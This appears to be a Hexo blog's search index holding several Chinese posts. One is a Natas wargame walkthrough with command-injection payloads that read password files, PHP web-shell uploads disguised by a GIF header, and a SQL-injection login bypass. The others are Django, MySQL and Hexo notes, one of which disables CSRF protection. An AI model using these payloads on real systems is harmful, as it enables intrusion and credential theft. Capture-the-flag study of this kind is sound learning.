<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Natas</title>
    <link href="/2020/05/23/Natas/"/>
    <url>/2020/05/23/Natas/</url>
    
    <content type="html"><![CDATA[<h1 id="natas"><a href="#natas" class="headerlink" title="natas"></a>natas</h1><h2 id="natas0"><a href="#natas0" class="headerlink" title="natas0"></a>natas0</h2><img src="/2020/05/23/Natas/image-20200523105927810.png" srcset="/img/loading.gif" class="" title="image-20200523105927810"><h2 id="natas1"><a href="#natas1" class="headerlink" title="natas1"></a>natas1</h2><p>禁用了右键，但还是可以F12或者</p><img src="/2020/05/23/Natas/image-20200523110204498.png" srcset="/img/loading.gif" class="" title="image-20200523110204498"><h2 id="natas2"><a href="#natas2" class="headerlink" title="natas2"></a>natas2</h2><p>打开过<code>files/pixel.png</code>，但没想到这是目录权限问题。。。。顺便搜了一下爆破文件目录的工具，kali自带的dirbuster <a href="https://www.cnblogs.com/xz25/p/12829315.html" target="_blank" rel="noopener">link</a></p><img src="/2020/05/23/Natas/image-20200523132558927.png" srcset="/img/loading.gif" class="" title="image-20200523132558927"><h2 id="natas3"><a href="#natas3" class="headerlink" title="natas3"></a>natas3</h2><img src="/2020/05/23/Natas/image-20200523133355938.png" srcset="/img/loading.gif" class="" title="image-20200523133355938"><p>谷歌找不到–九-曲-十-八-弯—&gt;robots.txt</p><p>awsl</p><h2 id="natas4"><a href="#natas4" class="headerlink" title="natas4"></a>natas4</h2><img src="/2020/05/23/Natas/image-20200523135615494.png" srcset="/img/loading.gif" class="" title="image-20200523135615494"><p>点击refresh之后Referer会显示，改成对应的natas5即可</p><h2 id="natas5"><a href="#natas5" class="headerlink" title="natas5"></a>natas5</h2><p>Login, 那就看cookie</p><img src="/2020/05/23/Natas/image-20200523140637488.png" srcset="/img/loading.gif" class="" title="image-20200523140637488"><p>改成1就行</p><h2 id="natas6"><a href="#natas6" class="headerlink" title="natas6"></a>natas6</h2><img src="/2020/05/23/Natas/image-20200523142611838.png" srcset="/img/loading.gif" class="" title="image-20200523142611838"><p>打开再按f12就可以看见了</p><h2 id="natas7"><a href="#natas7" class="headerlink" title="natas7"></a>natas7</h2><img src="/2020/05/23/Natas/image-20200523142927279.png" srcset="/img/loading.gif" class="" title="image-20200523142927279"><p>看到hint之后，就尝试在url中尝试page=ls</p><img src="/2020/05/23/Natas/image-20200523143009363.png" srcset="/img/loading.gif" class="" title="image-20200523143009363"><p>等号后输入hint的就行</p><h2 id="natas8"><a href="#natas8" class="headerlink" title="natas8"></a>natas8</h2><img src="/2020/05/23/Natas/image-20200523165112708.png" srcset="/img/loading.gif" class="" title="image-20200523165112708"><p>给的很清楚，输入的数值，先base64_encode，再strrev，再bin2hex，如果和encodedSecret一样就get了</p><pre><code class="php">&lt;?$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;$result = base64_decode(strrev(hex2bin($encodedSecret)));echo $result;?&gt;</code></pre><blockquote><p>mac 自带了php环境hhh真好</p></blockquote><h2 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h2><p>命令注入</p><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : void</p><p>同 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <em>image/gif</em>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><h3 id="参数-¶"><a href="#参数-¶" class="headerlink" title="参数 ¶"></a>参数<a href="https://www.php.net/manual/zh/function.passthru.php#refsect1-function.passthru-parameters" target="_blank" rel="noopener"> ¶</a></h3><ul><li><p><code>command</code></p><p>  要执行的命令。</p></li><li><p><code>return_var</code></p><p>  如果提供 <code>return_var</code> 参数， Unix 命令的返回状态会被记录到此参数。</p></li></ul></blockquote><p>密码均存储在/etc/natas_webpass目录下（百度来的</p><p> <code>passthru(&quot;grep -i $key dictionary.txt&quot;);</code></p><p>并且在shell中，#可以注释掉后面的</p><p>所以当</p><pre><code>$key = | cat /etc/natas_webpass/natas10 #$key = &amp; cat /etc/natas_webpass/natas10 #$key = | cat /etc/natas_webpass/natas10$key = &amp; cat /etc/natas_webpass/natas10</code></pre><p>时，对应的shell命令为</p><pre><code>grep -i | cat /etc/natas_webpass/natas10 dictionary.txtgrep -i &amp; cat /etc/natas_webpass/natas10</code></pre><p>这样都行</p><h2 id="natas10"><a href="#natas10" class="headerlink" title="natas10"></a>natas10</h2><pre><code class="php">if($key != &quot;&quot;) {    if(preg_match(&#39;/[;|&amp;]/&#39;,$key)) {        print &quot;Input contains an illegal character!&quot;;    } else {        passthru(&quot;grep -i $key dictionary.txt&quot;);    }</code></pre><blockquote><ul><li>Search in case-insensitive mode:<br>  grep -i search_string path/to/file</li></ul></blockquote><p>grep还可以用正则，所以这里</p><pre><code>$key = [a-zA-Z] /etc/natas_webpass/natas11 #grep -i [a-zA-Z] /etc/natas_webpass/natas11 # dictionary.txt</code></pre><h2 id="natas12"><a href="#natas12" class="headerlink" title="natas12"></a>natas12</h2><p>把文件名随机了，把后缀改成jpg了</p><p>内容没有检测，尝试upload的时候用bp把文件后缀改成php就可以打开，那</p><pre><code class="php">&lt;?    passthru(&#39;cat /etc/natas_webpass/natas13&#39;);?&gt;</code></pre><h2 id="natas13"><a href="#natas13" class="headerlink" title="natas13"></a>natas13</h2><p>通过 <code>php</code>的函数 <code>exif_imagetype()</code> 来判断文件夹类型，</p><p>可以查看php的文档，这个函数通过检查文件的签名（第一个字节），从而检测文件类型。</p><p>可以用<a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">GIF98a</a>来骗过</p><pre><code class="php">GIF98a&lt;?    passthru(&#39;cat /etc/natas_webpass/natas14&#39;);?&gt;</code></pre><h2 id="natas14"><a href="#natas14" class="headerlink" title="natas14"></a>natas14</h2><pre><code class="php">$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;; </code></pre><p>万能sql密码<code>&quot; OR 1=1 #</code></p><pre><code class="mysql">SELECT * from users where username=&quot;&quot; OR 1=1 # and password= &quot;&quot;</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库使用&amp;学习记录</title>
    <link href="/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库使用-amp-学习记录"><a href="#数据库使用-amp-学习记录" class="headerlink" title="数据库使用&amp;学习记录"></a>数据库使用&amp;学习记录</h1><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>GRANT CREATE TABLE TO  { PUBLIC | GROUP group | username }</p><p>GRANT ALTER TABLE</p><p><a href="https://blog.csdn.net/haydenwang8287/article/details/2105999" target="_blank" rel="noopener">Grant的用法</a></p><h2 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h2><p>一个窗口</p><pre><code>mysqld --shared-memory --skip-grant-tables</code></pre><p>另一个窗口</p><pre><code>mysql -u root -p//press enterFLUSH PRIVILEGESALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;你要设置的密码&#39;FLUSH PRIVILEGES</code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="mysql">#DELETE FROM SeatInformation  /*DELETE FROM SeatInformation */-- DELETE FROM SeatInformation</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo升级跳坑</title>
    <link href="/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/"/>
    <url>/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo升级跳坑"><a href="#hexo升级跳坑" class="headerlink" title="hexo升级跳坑"></a>hexo升级跳坑</h1><p>应该是从4.0升级到4.2，_config.yml的更改就不说了，主要讲讲昨天晚上都干了啥（吐血捂肝</p><p>4.2多了个友链（万恶起源）上来之后，最开始的变化就是，所有文章的日期都变成了<strong>创建时间</strong>，即便<strong>修改时间</strong>比创建时间还早0.0</p><p>于是，写了脚本给每个文章加上date，确定最早的发布/创建时间，并且，没有这个<a href="https://hexo.io/zh-cn/docs/front-matter" target="_blank" rel="noopener">Front-matter</a>是会报莫名其妙的YAMLException的。</p><pre><code class="python">import osimport sysimport timeimport datetimefpath = os.getcwd()path=os.path.abspath(os.path.dirname(__file__))#时间戳变成def shift_time(filename):    time_stamp_create = os.path.getctime(filename)    time_stamp_modify = os.path.getmtime(filename)    if time_stamp_create &gt; time_stamp_modify:        time_stamp = time_stamp_modify    else :        time_stamp = time_stamp_create    dateArray = datetime.datetime.fromtimestamp(time_stamp)      return dateArray.strftime(&quot;%Y/%m/%d %H:%M:%S&quot;) def writeback(filename,text):    s = &#39;&#39;.join(text)    with open(filename , &quot;w&quot; , encoding=&#39;utf-8&#39;,) as f:        f.write(s)#将文件创建时间或修改时间，最早的一个，写入date中，作为文章时间for parent, dirnames, filenames in os.walk(fpath):    for filename in filenames:                 temp=os.path.splitext(filename)        file,type=temp        if type == &quot;.md&quot;:            headline = False            head_exist = False            date_exist = False            line_num = False            create_date = shift_time(filename)             for line in open(filename,encoding=&#39;utf-8&#39;):                line_num += 1                if line == &quot;---\n&quot;:                    headline += 1                    continue                if &quot;date:&quot; in line:                    date_exist = True                    break                if headline == 2:                    head_exist = True                    break                if line_num == 10:                    break            if date_exist:                continue            elif head_exist:                text = []                for line in open(filename,encoding=&#39;utf-8&#39;):                     text.append(line)                text.insert(1 , &quot;date: &quot; + create_date + &#39;\n&#39;)                writeback(filename,text)                continue            else:                text = []                for line in open(filename,encoding=&#39;utf-8&#39;):                     text.append(line)                text.insert(0 , &quot;---\ndate: &quot; + create_date + &#39;\n---\n&#39;)                writeback(filename,text)</code></pre><p>这部分修改好了之后呢，跑起来测试之后发现图片加载不了了，原来的hexo-assets-image的图片src地址有误，没法用了，换了<a href="https://github.com/cocowool/hexo-image-link" target="_blank" rel="noopener">hexo-image-link</a>之后，可以是可以了，但是我原先的结构不能用了QAQ</p><blockquote><p>原先是图片都放在 markdown.assets/xxx.png 这样的，现在根据 官方和 image-link 的呢，只能改成  markdown/xxx.png 这样了 于是又写了这部分代码QAQ</p></blockquote><pre><code class="python">#先找到.assets文件夹，然后再去找md文件替换掉文件里的xxx.assets/image的.assetsfor folder in os.listdir():    if folder == &quot;.vscode&quot;:        continue    if os.path.isdir(folder)==True:        temp=os.path.splitext(folder)        file,type=temp        if type == &quot;.assets&quot;:            for parent, dirnames, filenames in os.walk(fpath):                for filename in filenames:                      if filename == file + &#39;.md&#39;:                        text = []                        for line in open(filename,encoding=&#39;utf-8&#39;):                             text.append(line.replace(&quot;.assets&quot;,&quot;&quot;))                        writeback(file + &#39;.md&#39;,text)        new_name=folder.replace(&#39;.assets&#39;,&#39;&#39;)        os.rename(os.path.join(path,folder),os.path.join(path,new_name))</code></pre><p>再加上调下typora的<strong>插入图片时</strong>改为复制到指定路径即可。</p><p>这样，我本地看也没有任何问题，发布出去也不会有问题，耶✌</p><p>懒才是最强生产力（确信</p><p>所以现在就是双击Winclick.bat 跑run.py。写完就丢嘿嘿</p><pre><code class="python">#run.pyimport osimport sysimport timeimport datetimefpath = os.getcwd()path=os.path.abspath(os.path.dirname(__file__))def shift_time(filename):    time_stamp_create = os.path.getctime(filename)    time_stamp_modify = os.path.getmtime(filename)    if time_stamp_create &gt; time_stamp_modify:        time_stamp = time_stamp_modify    else :        time_stamp = time_stamp_create    dateArray = datetime.datetime.fromtimestamp(time_stamp)      return dateArray.strftime(&quot;%Y/%m/%d %H:%M:%S&quot;) def writeback(filename,text):    s = &#39;&#39;.join(text)    with open(filename , &quot;w&quot; , encoding=&#39;utf-8&#39;,) as f:        f.write(s)#将文件创建时间或修改时间，最早的一个，写入date中，作为文章时间for parent, dirnames, filenames in os.walk(fpath):    for filename in filenames:                 temp=os.path.splitext(filename)        file,type=temp        if type == &quot;.md&quot;:            headline = False            head_exist = False            date_exist = False            line_num = False            create_date = shift_time(filename)             for line in open(filename,encoding=&#39;utf-8&#39;):                line_num += 1                if line == &quot;---\n&quot;:                    headline += 1                    continue                if &quot;date:&quot; in line:                    date_exist = True                    break                if headline == 2:                    head_exist = True                    break                if line_num == 10:                    break            if date_exist:                continue            elif head_exist:                text = []                for line in open(filename,encoding=&#39;utf-8&#39;):                     text.append(line)                text.insert(1 , &quot;date: &quot; + create_date + &#39;\n&#39;)                writeback(filename,text)                continue            else:                text = []                for line in open(filename,encoding=&#39;utf-8&#39;):                     text.append(line)                text.insert(0 , &quot;---\ndate: &quot; + create_date + &#39;\n---\n&#39;)                writeback(filename,text)for folder in os.listdir():    if folder == &quot;.vscode&quot;:        continue    if os.path.isdir(folder)==True:        temp=os.path.splitext(folder)        file,type=temp        if type == &quot;.assets&quot;:            for parent, dirnames, filenames in os.walk(fpath):                for filename in filenames:                      if filename == file + &#39;.md&#39;:                        text = []                        for line in open(filename,encoding=&#39;utf-8&#39;):                             text.append(line.replace(&quot;.assets&quot;,&quot;&quot;))                        writeback(file + &#39;.md&#39;,text)        new_name=folder.replace(&#39;.assets&#39;,&#39;&#39;)        os.rename(os.path.join(path,folder),os.path.join(path,new_name))os.system((&#39;cd {} &amp;&amp; hexo clean &amp;&amp; hexo gen &amp;&amp; hexo deploy&#39;).format(path))</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记一次转移环境上服务器</title>
    <link href="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次转移后端环境上服务器"><a href="#记一次转移后端环境上服务器" class="headerlink" title="记一次转移后端环境上服务器"></a>记一次转移后端环境上服务器</h1><p>本想着本地docker调好直接传上去的，然鹅一开vscode remote就崩</p><p>并且，vscode remote也仅指本地的docker里，不是云服务器的环境，QAQ</p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>xftp 学生免费版，可了</p><p>安装好数据库后，记得设置密码，<a href="https://www.mysqlzh.com/doc/19/63.html" target="_blank" rel="noopener">参考</a></p><p>修改utf8为utf8mb4</p><p><code>vim /etc/mysql/my.cnf</code></p><pre><code>[mysqld]character-set-server=utf8mb4[mysql]default-character-set=utf8mb4[client]default-character-set=utf8mb4                  </code></pre><p>数据导出，mysql 在powershell 使用mysqldump，使用的是utb-16编码，cmd里导出的就是utf8</p><blockquote><p>ERROR 1273 (HY000) at line 22: Unknown collation: ‘utf8mb4_0900_ai_ci’</p><p>文件中的所有的<code>utf8mb4_0900_ai_ci</code>替换为<code>utf8_general_ci</code></p><p>因为我这里都是使用utf8mb4的，如果是使用utf8的，把<code>utf8mb4</code>替换为<code>utf8</code></p></blockquote><p>然后<code>mysql -u root -p parking &lt; parking.sql</code></p><p>表写入数据库中。</p><blockquote><p>此处出现了写入表后，退出再进入无记录的情况，原因不明。但是在我把mysql5.7更换到跟开发环境相同的mysql8.0后（之前以为是8.0QAQ）再次写入就可以了</p></blockquote><h2 id="配置与部署"><a href="#配置与部署" class="headerlink" title="配置与部署"></a>配置与部署</h2><p>由于还没有摸透nginx和uwgsi，故先用了runserver的简陋（菜）形式测试了先，阿里云打开端口。==中间无数次临时debug，让我感觉到如果是本地改完远程直接同步会有多么的便利==</p><p>待补，nginx和uwgsi</p><h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>当然，以上并不是真正部署一个项目运行</p><p>可能在docker中开发测试好直接丢服务器上是最佳选择（当然跟我本地没测试通全部也有很大关系，主要还是测试不够）</p><p>然后在服务器升级环境的过程中，也一度只能干巴巴等着，好在阿里云的下载速度还是很快的。</p><p>结束之后，尝试了tmux，默认时候不能鼠标切换切分出来的窗口0.0（可能主要因为没设置好）</p><p>随后发现terminus自带了切分屏幕（哎，暴殄天物）</p><img src="/2020/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BD%AC%E7%A7%BB%E7%8E%AF%E5%A2%83%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200407022222234.png" srcset="/img/loading.gif" class="" title="image-20200407022222234"><p><strong>再次说明，项目不是真正部署了的QAQ，仅一点记录</strong></p><p>可参考的link：</p><p><a href="https://blog.csdn.net/qq_41448891/article/details/90696004" target="_blank" rel="noopener">https://blog.csdn.net/qq_41448891/article/details/90696004</a></p><p><a href="https://www.cnblogs.com/chenice/p/6921727.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenice/p/6921727.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>django学习记录</title>
    <link href="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="django学习记录"><a href="#django学习记录" class="headerlink" title="django学习记录"></a>django学习记录</h1><h2 id="将现有数据库导入到models-py中"><a href="#将现有数据库导入到models-py中" class="headerlink" title="将现有数据库导入到models.py中"></a>将现有数据库导入到models.py中</h2><pre><code class="shell">python manage.py inspectdb &gt; app/models.py</code></pre><h2 id="js实现定时刷新页面"><a href="#js实现定时刷新页面" class="headerlink" title="js实现定时刷新页面"></a>js实现定时刷新页面</h2><p><a href="https://blog.csdn.net/baidu_38990811/article/details/79172163" target="_blank" rel="noopener">Ajax轮询,Ajax长轮询和websocket(详细使用)</a></p><h2 id="django-shell-调试"><a href="#django-shell-调试" class="headerlink" title="django shell 调试"></a>django shell 调试</h2><p><code>python manage.py shell</code></p><h3 id="python小问题"><a href="#python小问题" class="headerlink" title="python小问题"></a>python小问题</h3><pre><code class="python">orders_num = ordersdate = orders_car_size = orders_price = []</code></pre><p>会指向同一个内存地址QAQ</p><p>叫引用赋值</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="访问不到写好的path"><a href="#访问不到写好的path" class="headerlink" title="访问不到写好的path"></a>访问不到写好的path</h3><pre><code class="python">urlpatterns = [   path(&#39;addUsers/&#39;,views.add_users,name=&#39;add_users&#39;)#api/addUsers]</code></pre><p>检查path(‘path/‘)的斜杠</p><h3 id="Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403"><a href="#Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403" class="headerlink" title="Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403"></a>Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403</h3><p>注释掉settings.py中的<br>MIDDLEWARE 的 ‘django.middleware.csrf.CsrfViewMiddleware’ </p><p><strong>连接mysql出错</strong></p><p>django.db.utils.OperationalError: (2059) <a href="https://www.jianshu.com/p/e6e6293af2dc" target="_blank" rel="noopener">解决办法</a></p><p><strong>orm查询</strong></p><p><a href="https://www.cnblogs.com/chenxinming-top/p/9506857.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenxinming-top/p/9506857.html</a></p><p><strong>引入bootstrap网站错位</strong></p><p>可能原本就引入了（XD</p><p><strong>异步加载数据</strong></p><p>从mysql读取数据，然后放置到echarts中，效果如图</p><p>echarts js</p><pre><code class="js">&lt;div id=&quot;main&quot; style=&quot;width: 790px;height:600px;&quot;&gt;&lt;/div&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      var develop_name_list = {{ develop_name_list|safe }};      var develop_num_list = {{ develop_num_list|safe }};      var myChart = echarts.init(document.getElementById(&#39;main&#39;));      var option = {          grid: {containLabel: true},          xAxis: {name: &#39;数量&#39;},          yAxis: {            type: &#39;category&#39;,            data: develop_name_list            },          series: [              {                  type: &#39;bar&#39;,                  encode: {x: &#39;amount&#39;,y: &#39;product&#39;},                  data: develop_num_list              }          ]      };      myChart.setOption(option);    &lt;/script&gt;</code></pre><p><code></code> 的<code>|safe</code>是必须的，<code>myChart.setOption(option);</code>也是必须的，并且</p><pre><code class="js">yAxis: {            type: &#39;category&#39;,            data: develop_name_list            },</code></pre><p>的type:也一定时category==目前仅知道针对这个图可行==</p><h3 id="使用bootstrap折叠面板之后在里面放置js不渲染"><a href="#使用bootstrap折叠面板之后在里面放置js不渲染" class="headerlink" title="使用bootstrap折叠面板之后在里面放置js不渲染"></a>使用bootstrap折叠面板之后在里面放置js不渲染</h3><p>还没会，无解qaq</p><h3 id="python模糊查询-问题"><a href="#python模糊查询-问题" class="headerlink" title="python模糊查询%问题"></a>python模糊查询%问题</h3><pre><code class="python">sql = &#39;&#39;&#39; SELECT job_Name,description FROM history                WHERE job_Name like &quot;%%{}%%&quot; and job_Name like &quot;%%{}%%&quot;&#39;&#39;&#39;.format(&#39;java&#39;,&#39;后端&#39;)</code></pre><h1 id="django后端开发"><a href="#django后端开发" class="headerlink" title="django后端开发"></a>django后端开发</h1><h2 id="接收header或body"><a href="#接收header或body" class="headerlink" title="接收header或body"></a>接收header或body</h2><pre><code class="python"> 获取正则匹配到的数据,num1未位置参数,num2为命名参数,def index(request,num2=None, num1=None): print(num2) # 构造响应数据 reNT&#39;) sp = HttpResponse(&#39;hello world&#39;) # 获取请求头 header = request.META.get(&#39;HTTP_USER_AGE) # 获取地址 path = request.path # 获取GET后面的数据(获取查询字符串数据) para = request.GET() # 获取json数据 json_data = request.body data = eval(request.body.decode()).get(&#39;asd&#39;) data1 = json.loads(request.body).get(&#39;asd&#39;) # 获取表单数据 form_data = request.POST # 获取请求方法 method = request.method # 获取文件 file_obj = request.FILES.get(&#39;image&#39;) return resp</code></pre><h2 id="token和cookie"><a href="#token和cookie" class="headerlink" title="token和cookie"></a>token和cookie</h2><p><a href="https://www.cnblogs.com/moyand/p/9047978.html" target="_blank" rel="noopener">参考资料</a></p><p>大部分api和web应用都用tokens，例如fb，google，推特，gihub</p><p>实现方法是JSON Web Tokens</p><p><a href="https://www.v2ex.com/t/530103" target="_blank" rel="noopener">详细-有案例-Django+JWT 实现 Token 认证</a></p><p><a href="https://juejin.im/post/59749e3751882559274bc80d#heading-11?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">理解JWT（JSON Web Token）认证及python实践</a></p><p><a href="https://juejin.im/post/5df04203e51d45581269a146?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">python接口自动化（二十）–token登录（详解）</a></p><p>可用库：<a href="https://github.com/jpadilla/pyjwt/" target="_blank" rel="noopener">pyjwt</a></p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>所有响应包含三部分，状态码 code、数据 data、消息 msg<br>所有内容都在 data 里，msg 是附加的状态消息</p><p>最后用了简单方法：</p><pre><code class="python">#后端def create_token(users_id,users_name):    payload = {        &quot;iss&quot;: &quot;parkingapp.com&quot;,         &quot;iat&quot;: int(time.time()),         &quot;exp&quot;: int(time.time()) + 86400 * 7,         &quot;users_id&quot;: users_id,         &quot;user_name&quot;: users_name,    }    token = jwt.encode(payload, &#39;secret&#39;, algorithm=&#39;HS256&#39;).decode(&#39;utf-8&#39;)    json_dict_success = {&#39;code&#39;: Httpcode.success,&#39;token&#39;: str(token)}    return JsonResponse(json_dict_success, json_dumps_params={&#39;ensure_ascii&#39;: False})</code></pre><pre><code class="js">&lt;!-- js --&gt;$.ajax({    type: &#39;POST&#39;,    url: &#39;http://localhost:8000&#39;+ add_users_api,    data: {users_name: name,            users_email: email,            users_phone: phone},    success: function(data) {        if (201 === data.code){            alert(&quot;注册成功！&quot;);            localStorage.setItem(&quot;token&quot;, data.token);        } else {            alert(&quot;注册失败，请在检查网络后重试！&quot;);        }     },    error: function(data) {        alert(&quot;注册失败，请在检查网络后重试！&quot;)     },});</code></pre><h3 id="识别token"><a href="#识别token" class="headerlink" title="识别token"></a>识别token</h3><pre><code class="js">var token = localStorage.getItem(&#39;token&#39;);console.log(token);if (null === token){    alert(&quot;请先登录或注册账户&quot;);}$.ajax({    type: &#39;POST&#39;,    url: &#39;http://localhost:8000&#39;+ verify_token,    data: {token: token},success: function(data){    alert(&#39;验证成功&#39;);},error: function(data){    alert(data)},});    </code></pre><pre><code class="python">def verify_token(request):    token = request.POST.get(&#39;token&#39;,0)    result = jwt.decode(token, &#39;secret&#39;, algorithm=&#39;HS256&#39;)</code></pre><h3 id="回传数据"><a href="#回传数据" class="headerlink" title="回传数据"></a>回传数据</h3><p>一开始是</p><p>大佬推荐改成如下图，面向对象</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="前端post数据到后端，后端接收到请求但无数据传递"><a href="#前端post数据到后端，后端接收到请求但无数据传递" class="headerlink" title="前端post数据到后端，后端接收到请求但无数据传递"></a>前端post数据到后端，后端接收到请求但无数据传递</h3><p>可能因为跨域</p><p>跨越定义 :由于浏览器同源策略，凡是发送请求的url的协议(http和https)、域名（<a href="http://www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。" target="_blank" rel="noopener">www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。</a></p><p><a href="https://www.cnblogs.com/randomlee/p/9752705.html" target="_blank" rel="noopener">https://www.cnblogs.com/randomlee/p/9752705.html</a></p><hr><h2 id="职业分类"><a href="#职业分类" class="headerlink" title="职业分类"></a>职业分类</h2><h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h3><h3 id="后端开发"><a href="#后端开发" class="headerlink" title="后端开发"></a>后端开发</h3><p>java python php .net c# c++ C vb Delpho perl Ruby Hadoop Node.js 数据挖掘 自然语言处理 搜索算法 精准推荐 全栈 Go ASP Shell 其他</p><h3 id="移动开发"><a href="#移动开发" class="headerlink" title="移动开发"></a>移动开发</h3><p>HTML5 Android IOS WP </p><h3 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h3><p>web前端 Flash html5 javascript U3D COCOS2D-X </p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试工程师 自动化测试 功能测试 性能测试 测试开发 游戏测试 白盒测试 灰盒测试 手机测试 硬件测试 测试经理</p><h3 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h3><p>运维工程师 运维开发 网络工程师 系统工程师 it支持 idc CDN f5 系统管理员</p><h3 id="DBA"><a href="#DBA" class="headerlink" title="DBA"></a>DBA</h3><p>mysql sqlserver oracle db2 mongoDB ETL</p><p>Hive 数据仓库</p><h3 id="高端职业"><a href="#高端职业" class="headerlink" title="高端职业"></a>高端职业</h3><p>技术经理 技术总监 架构师 cto 运维总监 技术合伙人 项目总监 测试总监 安全专家</p><h3 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h3><p>项目经理 项目助理</p><h3 id="硬件开发"><a href="#硬件开发" class="headerlink" title="硬件开发"></a>硬件开发</h3><p>硬件 嵌入式 自动化 单片机 电路设计 驱动开发 系统集成 fpga开发 dsp开发 arm开发 pcb工艺 模具设计 热传导 材料工程师 精益工程师 射频工程师</p><p>企业软件</p><p>实施工程师 售前工程师 售后工程师 BI工程师 </p><h2 id="产品类"><a href="#产品类" class="headerlink" title="产品类"></a>产品类</h2><h3 id="产品经理"><a href="#产品经理" class="headerlink" title="产品经理"></a>产品经理</h3><p>产品经理 页面产品经理 移动产品经理 产品助理 数据产品经理 电商产品经理 游戏策划 产品实习生</p><h3 id="产品设计师"><a href="#产品设计师" class="headerlink" title="产品设计师"></a>产品设计师</h3><p>网页产品设计 无线产品设计师</p><h3 id="高端职位"><a href="#高端职位" class="headerlink" title="高端职位"></a>高端职位</h3><p>产品部经理 产品总监</p><h2 id="设计类"><a href="#设计类" class="headerlink" title="设计类"></a>设计类</h2><h2 id="运营类"><a href="#运营类" class="headerlink" title="运营类"></a>运营类</h2><h2 id="市场"><a href="#市场" class="headerlink" title="市场"></a>市场</h2><blockquote><p>来源：<a href="http://www.360doc.com/content/17/0520/09/43284313_655479904.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/17/0520/09/43284313_655479904.shtml</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cisco课程代码记录</title>
    <link href="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/</url>
    
